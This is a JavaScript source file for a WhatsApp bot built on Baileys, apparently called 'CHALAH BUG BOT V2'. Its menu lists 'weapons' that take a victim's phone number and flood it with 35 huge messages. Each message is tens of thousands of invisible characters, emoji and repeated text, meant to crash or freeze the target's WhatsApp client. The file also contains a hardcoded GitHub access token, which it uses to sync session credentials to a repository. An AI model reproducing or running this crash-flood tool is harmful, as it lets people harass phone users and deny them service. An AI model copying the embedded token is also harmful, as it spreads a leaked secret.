const { 
    default: makeWASocket, 
    useMultiFileAuthState, 
    delay, 
    fetchLatestBaileysVersion, 
    DisconnectReason 
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const fs = require("fs");
const path = require("path");
const axios = require("axios");
const express = require("express");
const QRCode = require('qrcode');
const app = express();
const port = process.env.PORT || 3000;

// --- ULTRA CONFIG ---
const ownerNumber = "94742271802"; 
const logoUrl = 'https://files.catbox.moe/07hh33.png'; 
const voiceUrl = 'https://files.catbox.moe/xk6low.mp4'; 
const GITHUB_TOKEN = "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"; 
const GITHUB_REPO = "btest2619-sudo/Database-Md"; 
const SESSION_BRANCH = "session-data";

let premiumUsers = [ownerNumber]; 
let lastQR = "";

// --- GITHUB SYNC ---
async function uploadToGitHub(filePath, content) {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/${filePath}`;
        let sha = null;
        try { 
            const ex = await axios.get(url, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` }, params: { ref: SESSION_BRANCH } }); 
            sha = ex.data.sha; 
        } catch (e) {}
        await axios.put(url, { 
            message: `Sync ${filePath}`, 
            content: Buffer.from(content).toString('base64'), 
            branch: SESSION_BRANCH, 
            sha: sha || undefined 
        }, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` } });
    } catch (e) {}
}

async function loadSession() {
    try {
        const url = `https://api.github.com/repos/${GITHUB_REPO}/contents/session`;
        const res = await axios.get(url, { headers: { 'Authorization': `token ${GITHUB_TOKEN}` }, params: { ref: SESSION_BRANCH } });
        if (!fs.existsSync('./session')) fs.mkdirSync('./session');
        for (const f of res.data) {
            const fileRes = await axios.get(f.download_url);
            fs.writeFileSync(`./session/${f.name}`, typeof fileRes.data === 'object' ? JSON.stringify(fileRes.data) : fileRes.data);
        }
    } catch (e) {}
}

// --- BOT START ---
async function startBot() {
    await loadSession();
    const { state, saveCreds } = await useMultiFileAuthState('./session');
    
    const client = makeWASocket({
        auth: state,
        printQRInTerminal: true,
        logger: pino({ level: "silent" }),
        browser: ["CHALAH-404-V2", "Chrome", "3.0"]
    });

    client.ev.on('connection.update', async (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr) lastQR = qr; // වෙබ් එකේ පෙන්වන්න QR එක සේව් කරගන්නවා
        
        if (connection === 'open') {
            console.log("✅ BOT CONNECTED!");
            lastQR = "DONE";
        }
        if (connection === 'close') {
            const shouldReconnect = lastDisconnect.error?.output?.statusCode !== DisconnectReason.loggedOut;
            if (shouldReconnect) startBot();
        }
    });

    // Web logic to show QR
    app.get('/', async (req, res) => {
        if (lastQR === "DONE") return res.send("<h1>Bot is already Connected!</h1>");
        if (!lastQR) return res.send("<h1>Generating QR... Please Wait.</h1>");
        
        const qrImage = await QRCode.toDataURL(lastQR);
        res.send(`
            <body style="background:#000; color:#f00; text-align:center; font-family:sans-serif;">
                <h1>CHALAH BUG BOT V2 - QR SCANNER</h1>
                <img src="${qrImage}" style="border:5px solid #f00; margin-top:20px; width:300px;"/>
                <p>Scan this QR with your WhatsApp Linked Devices</p>
                <script>setTimeout(() => { location.reload(); }, 20000);</script>
            </body>
        `);
    });

    client.ev.on("messages.upsert", async (chat) => {
        const m = chat.messages[0];
        if (!m.message || m.key.fromMe) return;
        const from = m.key.remoteJid;
        const sn = m.key.participant ? m.key.participant.split('@')[0] : from.split('@')[0];
        const isPrem = premiumUsers.includes(sn) || sn === ownerNumber;
        const body = m.message.conversation || m.message.extendedTextMessage?.text || "";
        const cmd = body.startsWith(".") ? body.slice(1).trim().split(" ")[0].toLowerCase() : "";
        const q = body.trim().split(" ").slice(1).join(" ");

        if (cmd === 'menu') {
            const menu = `💀 *CHALAH BUG BOT V2.0* 💀\n━━━━━━━━━━━━━━━━━━━━━━━\n👤 *USER:* @${sn}\n👑 *RANK:* ${isPrem ? 'PREMIUM DESTROYER' : 'NORMAL USER'}\n━━━━━━━━━━━━━━━━━━━━━━━\n\n🔴 *FREE WEAPONS*\n.uicrash | .locbomb | .pollbug\n\n⚡ *PREMIUM WEAPONS (ULTRA)*\n◈ .ʀɪᴘ | .ᴅɪᴇ | .ꜰᴜʟʟ | .ʟᴀɢ | .404 | .ᴇɴᴅ | .ʜᴇලල\n\n_ULTRA HIGH POWERED PAYLOADS READY_`;
            await client.sendMessage(from, { image: { url: logoUrl }, caption: menu, mentions: [m.key.participant || from] });
            await client.sendMessage(from, { audio: { url: voiceUrl }, mimetype: 'audio/mp4', ptt: true }, { quoted: m });
        }

        const premCmds = ['rip', 'die', 'full', 'lag', '404', 'end', 'hell'];
        if (premCmds.includes(cmd)) {
            if (!isPrem) return m.reply("🚫 *PREMIUM REQUIRED!*");
            const target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            m.reply(`☣️ *ULTRA DEADLY PAYLOAD INJECTING TO ${q}...*`);
            
            // Ultra Heavy Payload (More Power)
            for(let i=0; i<35; i++) {
                const heavyBug = "‌".repeat(30000) + "🔥".repeat(8000) + "VOID-ERROR-404".repeat(2000);
                await client.sendMessage(target, { text: heavyBug });
                await delay(150);
            }
        }
    });

    client.ev.on("creds.update", async () => {
        await saveCreds();
        const files = fs.readdirSync('./session');
        for (const f of files) await uploadToGitHub(`session/${f}`, fs.readFileSync(`./session/${f}`, 'utf-8'));
    });
}

app.listen(port);
startBot();
